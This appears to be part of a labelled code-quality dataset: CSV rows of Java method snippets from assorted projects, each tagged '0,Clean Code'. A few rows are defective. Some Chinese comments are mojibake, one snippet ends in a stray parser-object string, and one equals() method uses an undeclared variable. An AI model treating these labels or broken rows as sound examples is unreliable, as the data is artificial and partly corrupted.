 else   if (payment instanceof TransactionDiagram.AdditionalPayment) {
    return ((TransactionDiagram.AdditionalPayment)payment).getOutputGlyph(walletTx);
  }
 else   if (walletTx.getToWallet(AppServices.get().getOpenWallets().keySet(),payment) != null) {
    return getDepositGlyph();
  }
 else   if (walletTx.isDuplicateAddress(payment)) {
    return getPaymentWarningGlyph();
  }
  return getPaymentGlyph();
}
",0,Clean Code
"@Override public long getTopMsgSeq(){
  return this.mInfo.getTopMsgSeq();
}
",0,Clean Code
"@PreAuthorize(""hasAuthority('pay-CfOrderController-countFinance')"") @Override @RequestMapping(value=""countFinance"",method=RequestMethod.GET) public ResponseResult countFinance(CfCountFinanceQuery cfCountFinanceQuery){
  cfCountFinanceQuery.setCountAll(false);
  if (cfCountFinanceQuery.getDate() == null || StringUtils.isEmpty(cfCountFinanceQuery.getDate()) || cfCountFinanceQuery.getDate().equals(""null"")) {
    cfCountFinanceQuery.setDate(null);
  }
  if (cfCountFinanceQuery.getEndDate() == null || StringUtils.isEmpty(cfCountFinanceQuery.getEndDate()) || cfCountFinanceQuery.getEndDate().equals(""null"")) {
    cfCountFinanceQuery.setEndDate(null);
  }
  if (cfCountFinanceQuery.getPaymentAgencyShortName() == null || StringUtils.isEmpty(cfCountFinanceQuery.getPaymentAgencyShortName()) || cfCountFinanceQuery.getPaymentAgencyShortName().equals(""null"")) {
    cfCountFinanceQuery.setPaymentAgencyShortName(null);
  }
  List<CountByDay> list=null;
  BigDecimal total=new BigDecimal(""0"");
switch (cfCountFinanceQuery.getCountType()) {
case ""before_day_count_by_day"":
    list=cfOrderService.limitDaysCountByDay(cfCountFinanceQuery);
  cfCountFinanceQuery.setCountAll(true);
List<CountByDay> countDay=cfOrderService.limitDaysCountByDay(cfCountFinanceQuery);
if (countDay.get(0) != null) {
total=countDay.get(0).getCount();
}
break;
case ""month_count_by_day"":
list=cfOrderService.yearMonthCountByDay(cfCountFinanceQuery);
cfCountFinanceQuery.setCountAll(true);
List<CountByDay> countMonth=cfOrderService.yearMonthCountByDay(cfCountFinanceQuery);
total=countMonth.get(0).getCount();
break;
case ""year_count_by_month"":
list=cfOrderService.yearCountByMonth(cfCountFinanceQuery);
cfCountFinanceQuery.setCountAll(true);
List<CountByDay> countYear=cfOrderService.yearCountByMonth(cfCountFinanceQuery);
total=countYear.get(0).getCount();
break;
}
if (list == null || list.size() == 0) {
return new ResponseResult(CommonCode.NO_MORE_DATAS);
}
return new ResponseResult(CommonCode.SUCCESS,list,total);
}",0,Clean Code
"@Test void should_execute_tool_when_toolChoice_is_auto_and_answer(){
  ToolSpecification retrievePaymentDate=ToolSpecification.builder().name(""retrieve-payment-date"").description(""Retrieve Payment Date"").addParameter(""transactionId"",STRING).build();
  List<ChatMessage> chatMessages=new ArrayList<>();
  UserMessage userMessage=userMessage(""What is the status of transaction T123?"");
  chatMessages.add(userMessage);
  List<ToolSpecification> toolSpecifications=asList(retrievePaymentStatus,retrievePaymentDate);
  Response<AiMessage> response=mistralLargeModel.generate(chatMessages,toolSpecifications);
  AiMessage aiMessage=response.content();
  assertThat(aiMessage.text()).isNull();
  assertThat(aiMessage.toolExecutionRequests()).hasSize(1);
  ToolExecutionRequest toolExecutionRequest=aiMessage.toolExecutionRequests().get(0);
  assertThat(toolExecutionRequest.name()).isEqualTo(""retrieve-payment-status"");
  assertThat(toolExecutionRequest.arguments()).isEqualToIgnoringWhitespace(""{\""transactionId\"":\""T123\""}"");
  assertThat(response.finishReason()).isEqualTo(TOOL_EXECUTION);
  chatMessages.add(aiMessage);
  ToolExecutionResultMessage toolExecutionResultMessage=ToolExecutionResultMessage.from(toolExecutionRequest,""{\""status\"": \""PAID\""}"");
  chatMessages.add(toolExecutionResultMessage);
  Response<AiMessage> response2=mistralLargeModel.generate(chatMessages);
  AiMessage aiMessage2=response2.content();
  assertThat(aiMessage2.text()).containsIgnoringCase(""T123"");
  assertThat(aiMessage2.text()).containsIgnoringCase(""paid"");
  assertThat(aiMessage2.toolExecutionRequests()).isNull();
  TokenUsage tokenUsage2=response2.tokenUsage();
  assertThat(tokenUsage2.inputTokenCount()).isEqualTo(69);
  assertThat(tokenUsage2.outputTokenCount()).isGreaterThan(0);
  assertThat(tokenUsage2.totalTokenCount()).isEqualTo(tokenUsage2.inputTokenCount() + tokenUsage2.outputTokenCount());
  assertThat(response2.finishReason()).isEqualTo(STOP);
}",0,Clean Code
"public Builder keyspace(String keyspace){
  this.keyspace=keyspace;
  return this;
}
",0,Clean Code
"private TreeModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TreeModelProto(){
  nodes_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@19820e5b",0,Clean Code
"public String getGroupId(){
  return groupId;
}
",0,Clean Code
"protected void listDataImportFileInfos(File directory,FileFilter fileFilter,String parentPath,String displayParentPath,List<DataImportFileInfo> dataImportFileInfos){
  if (parentPath == null)   parentPath="""";
 else   if (parentPath.isEmpty())   ;
 else {
    if (!parentPath.endsWith(File.separator))     parentPath+=File.separator;
  }
  if (displayParentPath == null)   displayParentPath="""";
 else   if (displayParentPath.isEmpty())   ;
 else {
    if (!displayParentPath.endsWith(File.separator))     displayParentPath+=File.separator;
  }
  File[] files=directory.listFiles(fileFilter);
  for (  File file : files) {
    String myPath=parentPath + file.getName();
    String myDisplayPath=displayParentPath + file.getName();
    if (file.isDirectory())     listDataImportFileInfos(file,fileFilter,myPath,myDisplayPath,dataImportFileInfos);
 else {
      DataImportFileInfo fileInfo=new DataImportFileInfo(myPath,file.length(),myDisplayPath,DataImportFileInfo.fileNameToTableName(file.getName()));
      dataImportFileInfos.add(fileInfo);
    }
  }
}
",0,Clean Code
"/** 
 * Tells if this module amends a module (namely  {@link #getSupermodule()}). 
 */
public boolean isAmend(){
  return isAmend;
}
",0,Clean Code
"@Override public TypeRef<?> toTypeToken(ClassResolver classResolver){
  return TypeRef.of(classResolver.getRegisteredClass(classId));
}
",0,Clean Code
"/** 
 * 浣跨敤绉侀挜鏁版嵁杩涜瑙ｅ瘑
 * @param content       寰呰В瀵嗙殑鏁版嵁
 * @param privateKeyStr 绉侀挜瀛楃涓�
 * @return String 瑙ｅ瘑鍚庣殑鏁版嵁
 */
public static String decrypt(byte[] content,String privateKeyStr){
  return decrypt(content,privateKeyStr,KEY_ALGORITHM,StandardCharsets.UTF_8);
}
/** 
 * 浣跨敤绉侀挜鏁版嵁杩涜瑙ｅ瘑
 * @param content       寰呰В瀵嗙殑鏁版嵁
 * @param privateKeyStr 绉侀挜瀛楃涓�
 * @param algorithm     绠楁硶
 * @param charset       瀛楃闆�
 * @return String 瑙ｅ瘑鍚庣殑鏁版嵁
 */
public static String decrypt(byte[] content,String privateKeyStr,String algorithm,Charset charset){
  if (null == charset) {
    charset=StandardCharsets.UTF_8;
  }
  PrivateKey privateKey=getPrivateKey(privateKeyStr);
  byte[] byteArr=privateKeyDecrypt(content,privateKey,algorithm);
  return new String(byteArr,charset);
}",0,Clean Code
"public int getIsSetProclamation(){
  return this.isSetProclamation;
}
",0,Clean Code
"@Specialization @TruffleBoundary protected Object eval(@SuppressWarnings(""unused"") VmTyped self){
  return releaseFactory.create(Release.current());
}
",0,Clean Code
"BigDecimal getDecimal(int ordinal,ArrowType.Decimal decimalType){
  if (isNullAt(ordinal)) {
    return null;
  }
  MemoryBuffer buffer=getBuffer(ordinal);
  ArrowBuf arrowBuf=ArrowUtils.decimalArrowBuf();
  buffer.copyToUnsafe(0,null,arrowBuf.memoryAddress(),DECIMAL_BYTE_LENGTH);
  BigDecimal decimal=DecimalUtility.getBigDecimalFromArrowBuf(arrowBuf,0,decimalType.getScale(),DECIMAL_BYTE_LENGTH);
  return decimal;
}",0,Clean Code
"/** 
 * @param visibilityTimeout Visibility timeout for the message in SECONDS
 * @return builder instance
 */
public Builder withVisibilityTimeout(int visibilityTimeout){
  this.visibilityTimeout=visibilityTimeout;
  return this;
}
",0,Clean Code
"/** 
 * Stop fetch worker threads
 * @param onlySetStatus  Whether to only set the state without stopping the operation
 */
public void stopFetchWorkers(boolean onlySetStatus) throws InterruptedException {
  if (onlySetStatus) {
    if (this.managerStatus.get() == 0) {
      return;
    }
    this.managerStatus.set(0);
    if (MessageFetchManager.this.pushConsumer.isConsumePaused()) {
      MessageFetchManager.this.pushConsumer.resumeConsume();
    }
    return;
  }
 else {
    this.managerStatus.set(0);
  }
  if (this.fetchWorkerPool == null) {
    return;
  }
  StringBuilder sBuilder=new StringBuilder(256);
  logger.info(sBuilder.append(""[STOP_FetchWorker] All fetch workers:"").append(Arrays.toString(fetchWorkerPool)).toString());
  sBuilder.delete(0,sBuilder.length());
  if (MessageFetchManager.this.pushConsumer.isConsumePaused()) {
    MessageFetchManager.this.pushConsumer.resumeConsume();
  }
  logger.info(""[STOP_FetchWorker] Wait all fetch workers exist:"");
  if (waitAllFetchRequestHolds(this.consumerConfig.getPushListenerWaitPeriodMs())) {
    for (    final Thread thread : this.fetchWorkerPool) {
      if (thread != null) {
        thread.interrupt();
      }
    }
    for (    final Thread thread : this.fetchWorkerPool) {
      if (thread != null) {
        thread.join();
        logger.info(sBuilder.append(""[STOP_FetchWorker]"").append(thread).toString());
        sBuilder.delete(0,sBuilder.length());
      }
    }
  }
  this.pushConsumer.getBaseConsumer().notifyAllMessageListenerStopped();
  Thread.sleep(200);
  logger.info(""[STOP_FetchWorker] All fetch workers are stopped."");
}",0,Clean Code
"/** 
 * @param sleepWhenRetry time in milliseconds, for which the thread should sleep when taskupdate call fails, before retrying the operation.
 * @return Returns the current instance.
 */
public Builder withSleepWhenRetry(int sleepWhenRetry){
  this.sleepWhenRetry=sleepWhenRetry;
  return this;
}
",0,Clean Code
"public static StartCocoonStageCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new StartCocoonStageCsReq(),data).checkInitialized();
}
public static StartCocoonStageCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new StartCocoonStageCsReq(),input).checkInitialized();
}
public static StartCocoonStageCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new StartCocoonStageCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * Adds output
 * @param key output field
 * @param value value
 * @return current instance
 */
public TaskResult addOutputData(String key,Object value){
  this.outputData.put(key,value);
  return this;
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 9;</code>
 * @param value the retcode to set
 * @return this
 */
public SceneEntityTeleportScRsp setRetcode(final int value){
  bitField0_|=0x00000002;
  retcode=value;
  return this;
}",0,Clean Code
"/** 
 * Returns the name of the module.
 * @return The name of the module. This value is guaranteed to be non-null.
 */
String getName();
",0,Clean Code
"@Override public RogueMiracleSelectResult copyFrom(final RogueMiracleSelectResult other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    miracleId=other.miracleId;
  }
  return this;
}",0,Clean Code
"@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (!(obj instanceof PathElement))   return false;
  return isDirectory == other.isDirectory && name.equals(other.name);
}
",0,Clean Code
"public String toString(){
  return ""GProYLGameTeamInfo{guildId="" + this.guildId + "",channelId=""+ this.channelId+ "",teamId=""+ this.teamId+ "",teamStatus=""+ this.teamStatus+ "",readyExpireTime=""+ this.readyExpireTime+ "",icon=""+ this.icon+ "",totalMemberNum=""+ this.totalMemberNum+ "",curMemmberNum=""+ this.curMemmberNum+ "",gameId=""+ this.gameId+ "",gameAppid=""+ this.gameAppid+ "",gamePath=""+ this.gamePath+ "",gameExtraData=""+ this.gameExtraData+ "",gameEnvVersion=""+ this.gameEnvVersion+ "",modeId=""+ this.modeId+ "",isPk=""+ this.isPk+ "",}"";
}
",0,Clean Code
"public ArrayList<String> getNewsUrlList(){
  return this.newsUrlList;
}
",0,Clean Code
"private Db2ChangeTable[] getCdcTablesToQuery(Db2Partition partition,Db2OffsetContext offsetContext) throws SQLException, InterruptedException {
  final Set<Db2ChangeTable> cdcEnabledTables=dataConnection.listOfChangeTables();
  if (cdcEnabledTables.isEmpty()) {
    LOGGER.warn(""No table has enabled CDC or security constraints prevents getting the list of change tables"");
  }
  final Map<TableId,List<Db2ChangeTable>> includedAndCdcEnabledTables=cdcEnabledTables.stream().filter(changeTable -> {
    if (connectorConfig.getTableFilters().dataCollectionFilter().isIncluded(changeTable.getSourceTableId())) {
      return true;
    }
 else {
      LOGGER.info(""CDC is enabled for table {} but the table is not included by connector"",changeTable);
      return false;
    }
  }
).collect(Collectors.groupingBy(x -> x.getSourceTableId()));
  if (includedAndCdcEnabledTables.isEmpty()) {
    LOGGER.warn(DatabaseSchema.NO_CAPTURED_DATA_COLLECTIONS_WARNING);
  }
  final List<Db2ChangeTable> tables=new ArrayList<>();
  for (  List<Db2ChangeTable> captures : includedAndCdcEnabledTables.values()) {
    Db2ChangeTable currentTable=captures.get(0);
    if (captures.size() > 1) {
      Db2ChangeTable futureTable;
      if (captures.get(0).getStartLsn().compareTo(captures.get(1).getStartLsn()) < 0) {
        futureTable=captures.get(1);
      }
 else {
        currentTable=captures.get(1);
        futureTable=captures.get(0);
      }
      currentTable.setStopLsn(futureTable.getStartLsn());
      tables.add(futureTable);
      LOGGER.info(""Multiple capture instances present for the same table: {} and {}"",currentTable,futureTable);
    }
    if (schema.tableFor(currentTable.getSourceTableId()) == null) {
      LOGGER.info(""Table {} is new to be monitored by capture instance {}"",currentTable.getSourceTableId(),currentTable.getCaptureInstance());
      offsetContext.event(currentTable.getSourceTableId(),Instant.now());
      dispatcher.dispatchSchemaChangeEvent(partition,currentTable.getSourceTableId(),new Db2SchemaChangeEventEmitter(partition,offsetContext,currentTable,dataConnection.getTableSchemaFromTable(currentTable),SchemaChangeEventType.CREATE));
    }
    tables.add(currentTable);
  }
  return tables.toArray(new Db2ChangeTable[tables.size()]);
}",0,Clean Code
"public void switchToAccount(int account,boolean removeAll){
  switchToAccount(account,removeAll,obj -> new DialogsActivity(null));
}
public void switchToAccount(int account,boolean removeAll,GenericProvider<Void,DialogsActivity> dialogsActivityProvider){
  if (account == UserConfig.selectedAccount || !UserConfig.isValidAccount(account)) {
    return;
  }
  ConnectionsManager.getInstance(currentAccount).setAppPaused(true,false);
  UserConfig.selectedAccount=account;
  UserConfig.getInstance(0).saveConfig(false);
  checkCurrentAccount();
  if (AndroidUtilities.isTablet()) {
    layersActionBarLayout.removeAllFragments();
    rightActionBarLayout.removeAllFragments();
    if (!tabletFullSize) {
      shadowTabletSide.setVisibility(View.VISIBLE);
      if (rightActionBarLayout.getFragmentStack().isEmpty()) {
        backgroundTablet.setVisibility(View.VISIBLE);
      }
      rightActionBarLayout.getView().setVisibility(View.GONE);
    }
    layersActionBarLayout.getView().setVisibility(View.GONE);
  }
  if (removeAll) {
    actionBarLayout.removeAllFragments();
  }
 else {
    actionBarLayout.removeFragmentFromStack(0);
  }
  DialogsActivity dialogsActivity=dialogsActivityProvider.provide(null);
  dialogsActivity.setSideMenu(sideMenu);
  actionBarLayout.addFragmentToStack(dialogsActivity,0);
  drawerLayoutContainer.setAllowOpenDrawer(true,false);
  actionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
  if (AndroidUtilities.isTablet()) {
    layersActionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
    rightActionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
  }
  if (!ApplicationLoader.mainInterfacePaused) {
    ConnectionsManager.getInstance(currentAccount).setAppPaused(false,false);
  }
  if (UserConfig.getInstance(account).unacceptedTermsOfService != null) {
    showTosActivity(account,UserConfig.getInstance(account).unacceptedTermsOfService);
  }
  updateCurrentConnectionState(currentAccount);
  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.updateUserStatus,(Object)null);
}",0,Clean Code
"/** 
 * <code>optional .MsgType msg_type = 9;</code>
 * @return the msgType
 */
public MsgTypeOuterClass.MsgType getMsgType(){
  return MsgTypeOuterClass.MsgType.forNumber(msgType);
}",0,Clean Code
"/** 
 * Returns text from a single  {@link TextContent}. Use this accessor only if you are certain that the message contains only a single text. If the message contains multiple  {@link Content}s, or if the only  {@link Content} is not a {@link TextContent}, a  {@link RuntimeException} is thrown.
 * @return a single text.
 * @see #hasSingleText()
 */
public String singleText(){
  if (hasSingleText()) {
    return ((TextContent)contents.get(0)).text();
  }
 else {
    throw runtime(""Expecting single text content, but got: "" + contents);
  }
}",0,Clean Code
"public DurationUnit getUnit(){
  return unit;
}
",0,Clean Code
"/** 
 * Sets the value to uninitialized; a proceeding call to get() will trigger a call to initialValue().
 */
@SuppressWarnings(""unchecked"") public final void remove(){
  remove(InternalThreadLocalMap.getIfSet());
}
/** 
 * Sets the value to uninitialized for the specified thread local map; a proceeding call to get() will trigger a call to initialValue(). The specified thread local map must be for the current thread.
 */
@SuppressWarnings(""unchecked"") public final void remove(InternalThreadLocalMap threadLocalMap){
  if (threadLocalMap == null) {
    return;
  }
  Object v=threadLocalMap.removeIndexedVariable(index);
  removeFromVariablesToRemove(threadLocalMap,this);
  if (v != InternalThreadLocalMap.UNSET) {
    try {
      onRemoval((V)v);
    }
 catch (    Exception e) {
      throw new RuntimeException(e);
    }
  }
}
",0,Clean Code
"private void applyChanges(){
  final HashSet<OptionStorage<?>> dirtyStorages=new HashSet<>();
  final EnumSet<OptionFlag> flags=EnumSet.noneOf(OptionFlag.class);
  this.getAllOptions().forEach((option -> {
    if (!option.hasChanged()) {
      return;
    }
    option.applyChanges();
    flags.addAll(option.getFlags());
    dirtyStorages.add(option.getStorage());
  }
));
  Minecraft client=Minecraft.getInstance();
  if (client.level != null) {
    if (flags.contains(OptionFlag.REQUIRES_RENDERER_RELOAD)) {
      client.levelRenderer.allChanged();
    }
 else     if (flags.contains(OptionFlag.REQUIRES_RENDERER_UPDATE)) {
      client.levelRenderer.needsUpdate();
    }
  }
  if (flags.contains(OptionFlag.REQUIRES_ASSET_RELOAD)) {
    client.updateMaxMipLevel(client.options.mipmapLevels().get());
    client.delayTextureReload();
  }
  if (flags.contains(OptionFlag.REQUIRES_GAME_RESTART)) {
    Console.instance().logMessage(MessageLevel.WARN,Component.translatable(""sodium.console.game_restart""),10.0);
  }
  for (  OptionStorage<?> storage : dirtyStorages) {
    storage.save();
  }
}",0,Clean Code
"public abstract int onSSOPingResponse(byte[] bArr,int i2);",0,Clean Code
"public NewBuddyGrayElement getElem(){
  return this.elem;
}
",0,Clean Code
"private Function getProxy(){
  return proxy;
}
",0,Clean Code
"private void updateAlarmVisibility(Object thisObject,boolean state){
  try {
    Object mIconController=XposedHelpers.getObjectField(thisObject,""mIconController"");
    if (!state) {
      XposedHelpers.callMethod(mIconController,""setIconVisibility"",""alarm_clock"",false);
      return;
    }
    Context mContext=(Context)XposedHelpers.getObjectField(thisObject,""mContext"");
    long nowTime=java.lang.System.currentTimeMillis();
    long nextTime;
    try {
      nextTime=(long)XposedHelpers.getAdditionalInstanceField(thisObject,""mNextAlarmTime"");
    }
 catch (    Throwable t) {
      nextTime=getNextMIUIAlarmTime(mContext);
    }
    if (nextTime == 0)     nextTime=getNextStockAlarmTime(mContext);
    long diffMSec=nextTime - nowTime;
    if (diffMSec < 0)     diffMSec+=7 * 24 * 60* 60* 1000;
    float diffHours=(diffMSec - 59 * 1000) / (1000f * 60f * 60f);
    boolean vis=diffHours <= mPrefsMap.getInt(""system_ui_status_bar_icon_alarm_clock_n"",0);
    XposedHelpers.callMethod(mIconController,""setIconVisibility"",""alarm_clock"",vis);
    mIconController=XposedHelpers.getObjectField(thisObject,""miuiDripLeftStatusBarIconController"");
    XposedHelpers.callMethod(mIconController,""setIconVisibility"",""alarm_clock"",vis);
    logI(TAG,this.lpparam.packageName,""Now is "" + diffHours + ""min remain, show when ""+ vis+ ""min remain."");
  }
 catch (  Throwable t) {
    logE(TAG,this.lpparam.packageName,""updateAlarmVisibility failed"",t);
  }
}",0,Clean Code
"public static int endFBSFoo(FlatBufferBuilder builder){
  int o=builder.endTable();
  return o;
}
",0,Clean Code
"public static String getConfigPrefix(){
  return CONFIG_PREFIX;
}
",0,Clean Code
"public GameServer getServer(){
  return server;
}
",0,Clean Code
"@Override public void nodeClicked(final CombinedDiffNode node,final MouseEvent event,final double x,final double y){
  if (SwingUtilities.isRightMouseButton(event)) {
    if (node.getRawNode() instanceof RawCombinedFunction) {
      final JPopupMenu menu=new CallGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
 else     if (node.getRawNode() instanceof RawCombinedBasicBlock) {
      final JPopupMenu menu=new FlowGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
    return;
  }
  if (SwingUtilities.isLeftMouseButton(event) && event.getClickCount() == 2 && graph.getGraphType() == EGraphType.CALL_GRAPH) {
    controller.openFlowgraphsViews(node);
  }
}",0,Clean Code
"/** 
 * 鏍规嵁 batchId 鍒犻櫎鏂囦欢
 * @param requestBO
 */
void deleteByBatchId(FileDeleteRequestBO requestBO);
",0,Clean Code
"@Override public void execute(VirtualFrame frame,Object value){
  if (contains(value))   return;
  throw typeMismatch(value,stringLiterals);
}
",0,Clean Code
"/** 
 * <code>repeated .PileItem return_item_list = 15;</code>
 * @param values the returnItemList to add
 * @return this
 */
public ExpUpEquipmentScRsp addAllReturnItemList(final PileItemOuterClass.PileItem... values){
  bitField0_|=0x00000002;
  returnItemList.addAll(values);
  return this;
}",0,Clean Code
"@Override public String queryInsuranceScale(QueryInsuranceScaleBO queryInsuranceScaleBO){
  String cityId=queryInsuranceScaleBO.getCityId();
  String hujiId=queryInsuranceScaleBO.getHujiId();
  String key=HrmCacheKey.INSURANCE_SCALE_CACHE_KEY + cityId + "":""+ hujiId;
  String body;
  if (redis.exists(key)) {
    body=redis.get(key);
  }
 else {
    Map<String,Object> paramMap=new HashMap<>();
    paramMap.put(""js_cityid_name"",cityId);
    paramMap.put(""cs_classtype"",hujiId);
    paramMap.put(""X-Requested-With"",""XMLHttpRequest"");
    body=HttpUtil.createGet(""https://www.shebao100.cn/user/funbasequery"").form(paramMap).execute().body();
    redis.setex(key,60 * 60 * 24* 7,body);
  }
  return body;
}",0,Clean Code
"/** 
 * Retrieves messages for a specified chat memory.
 * @param memoryId The ID of the chat memory.
 * @return List of messages for the specified chat memory. Must not be null. Can be deserialized from JSON using {@link ChatMessageDeserializer}.
 */
List<ChatMessage> getMessages(Object memoryId);
",0,Clean Code
"@Override public ExprCode doGenCode(CodegenContext ctx){
  Class<?> javaType=getRawType(type);
  if (isPrimitive(javaType)) {
    javaType=boxedType(javaType);
  }
  if (value == null) {
    LiteralValue defaultLiteral=new LiteralValue(javaType,defaultValue(javaType));
    return new ExprCode(null,TrueLiteral,defaultLiteral);
  }
 else {
    if (javaType == String.class) {
      return new ExprCode(FalseLiteral,new LiteralValue(""\"""" + value + ""\""""));
    }
 else     if (javaType == Boolean.class || javaType == Integer.class) {
      return new ExprCode(null,FalseLiteral,new LiteralValue(javaType,value.toString()));
    }
 else     if (javaType == Float.class) {
      Float f=(Float)value;
      if (f.isNaN()) {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,""Float.NaN""));
      }
 else       if (f.equals(Float.POSITIVE_INFINITY)) {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,""Float.POSITIVE_INFINITY""));
      }
 else       if (f.equals(Float.NEGATIVE_INFINITY)) {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,""Float.NEGATIVE_INFINITY""));
      }
 else {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,String.format(""%fF"",f)));
      }
    }
 else     if (javaType == Double.class) {
      Double d=(Double)value;
      if (d.isNaN()) {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,""Double.NaN""));
      }
 else       if (d.equals(Double.POSITIVE_INFINITY)) {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,""Double.POSITIVE_INFINITY""));
      }
 else       if (d.equals(Double.NEGATIVE_INFINITY)) {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,""Double.NEGATIVE_INFINITY""));
      }
 else {
        return new ExprCode(FalseLiteral,new LiteralValue(javaType,String.format(""%fD"",d)));
      }
    }
 else     if (javaType == Byte.class) {
      return new ExprCode(FalseLiteral,Code.exprValue(javaType,String.format(""(%s)%s"",""byte"",value)));
    }
 else     if (javaType == Short.class) {
      return new ExprCode(FalseLiteral,Code.exprValue(javaType,String.format(""(%s)%s"",""short"",value)));
    }
 else     if (javaType == Long.class) {
      return new ExprCode(FalseLiteral,new LiteralValue(javaType,String.format(""%dL"",((Number)(value)).longValue())));
    }
 else     if (isPrimitive(javaType)) {
      return new ExprCode(FalseLiteral,new LiteralValue(javaType,String.valueOf(value)));
    }
 else     if (javaType == Class.class) {
      String v;
      Class<?> valueClass=(Class<?>)value;
      if (valueClass.isArray()) {
        v=String.format(""%s.class"",TypeUtils.getArrayType((Class<?>)value));
      }
 else {
        v=String.format(""%s.class"",ReflectionUtils.getCanonicalName((Class<?>)(value)));
      }
      return new ExprCode(FalseLiteral,new LiteralValue(javaType,v));
    }
 else {
      throw new UnsupportedOperationException(""Unsupported type "" + javaType);
    }
  }
}
",0,Clean Code
"public static void goToPulledDialog(BaseFragment fragment,PulledDialog dialog){
  if (dialog == null) {
    return;
  }
  if (dialog.activity == ChatActivity.class) {
    Bundle bundle=new Bundle();
    if (dialog.chat != null) {
      bundle.putLong(""chat_id"",dialog.chat.id);
    }
 else     if (dialog.user != null) {
      bundle.putLong(""user_id"",dialog.user.id);
    }
    bundle.putInt(""dialog_folder_id"",dialog.folderId);
    bundle.putInt(""dialog_filter_id"",dialog.filterId);
    if (dialog.topic != null) {
      ChatActivity chatActivity=ForumUtilities.getChatActivityForTopic(fragment,dialog.chat.id,dialog.topic,0,bundle);
      fragment.presentFragment(chatActivity,true);
    }
 else {
      fragment.presentFragment(new ChatActivity(bundle),true);
    }
  }
 else   if (dialog.activity == ProfileActivity.class) {
    Bundle bundle=new Bundle();
    bundle.putLong(""dialog_id"",dialog.dialogId);
    fragment.presentFragment(new ProfileActivity(bundle),true);
  }
  if (dialog.activity == TopicsFragment.class) {
    Bundle bundle=new Bundle();
    bundle.putLong(""chat_id"",dialog.chat.id);
    fragment.presentFragment(new TopicsFragment(bundle),true);
  }
  if (dialog.activity == DialogsActivity.class) {
    fragment.presentFragment(new DialogsActivity(null),true);
  }
}",0,Clean Code
"public void initWriter(FlinkXJsonBuildDto flinkxJsonDto,JobDatasource readerDatasource){
  this.writerDatasource=readerDatasource;
  this.writerTables=flinkxJsonDto.getWriterTables();
  this.writerColumns=flinkxJsonDto.getWriterColumns();
  this.hiveWriterDto=flinkxJsonDto.getHiveWriter();
  this.rdbmsWriterDto=flinkxJsonDto.getRdbmsWriter();
  this.hbaseWriterDto=flinkxJsonDto.getHbaseWriter();
  this.mongoDBWriterDto=flinkxJsonDto.getMongoDBWriter();
  String datasource=readerDatasource.getDatasource();
  if (JdbcConstants.MYSQL.equals(datasource)) {
    writerPlugin=new MysqlWriter();
    buildWriter=this.buildWriter();
  }
 else   if (JdbcConstants.ORACLE.equals(datasource)) {
    writerPlugin=new OraclelWriter();
    buildWriter=this.buildWriter();
  }
 else   if (JdbcConstants.HANA.equals(datasource)) {
    writerPlugin=new HanaWriter();
    buildWriter=this.buildWriter();
  }
 else   if (JdbcConstants.SQL_SERVER.equals(datasource)) {
    writerPlugin=new SqlServerlWriter();
    buildWriter=this.buildWriter();
  }
 else   if (JdbcConstants.POSTGRESQL.equals(datasource)) {
    writerPlugin=new PostgresqllWriter();
    buildWriter=this.buildWriter();
  }
 else   if (JdbcConstants.CLICKHOUSE.equals(datasource)) {
    writerPlugin=new ClickHouseWriter();
    buildWriter=buildWriter();
  }
 else   if (JdbcConstants.HIVE.equals(datasource)) {
    writerPlugin=new HiveWriter();
    buildWriter=this.buildHiveWriter();
  }
 else   if (JdbcConstants.HBASE.equals(datasource)) {
    writerPlugin=new HBaseWriter();
    buildWriter=this.buildHBaseWriter();
  }
 else   if (JdbcConstants.MONGODB.equals(datasource)) {
    writerPlugin=new MongoDBWriter();
    buildWriter=this.buildMongoDBWriter();
  }
}
",0,Clean Code
"@Override public Map<String,List<Pair<String,Double>>> getTopFeatures(int n){
  int maxFeatures=n < 0 ? featureIDMap.size() + 1 : n;
  Comparator<Pair<String,Double>> comparator=Comparator.comparing(Pair::getB);
  int numClasses=outputIDMap.size();
  int numFeatures=featureIDMap.size();
  Map<String,List<Pair<String,Double>>> map=new HashMap<>();
  for (int i=0; i < numClasses; i++) {
    PriorityQueue<Pair<String,Double>> q=new PriorityQueue<>(maxFeatures,comparator);
    for (int j=0; j < numFeatures; j++) {
      Pair<String,Double> curr=new Pair<>(featureIDMap.get(j).getName(),parameters.getWeight(i,j));
      if (q.size() < maxFeatures) {
        q.offer(curr);
      }
 else       if (comparator.compare(curr,q.peek()) > 0) {
        q.poll();
        q.offer(curr);
      }
    }
    Pair<String,Double> curr=new Pair<>(BIAS_FEATURE,parameters.getBias(i));
    if (q.size() < maxFeatures) {
      q.offer(curr);
    }
 else     if (comparator.compare(curr,q.peek()) > 0) {
      q.poll();
      q.offer(curr);
    }
    List<Pair<String,Double>> b=new ArrayList<>();
    while (q.size() > 0) {
      b.add(q.poll());
    }
    Collections.reverse(b);
    map.put(outputIDMap.getOutput(i).getLabel(),b);
  }
  return map;
}",0,Clean Code
"@Fallback @TruffleBoundary protected Object fallback(@SuppressWarnings(""unused"") Object receiver,Object arg1,Object arg2,Object arg3,Object arg4){
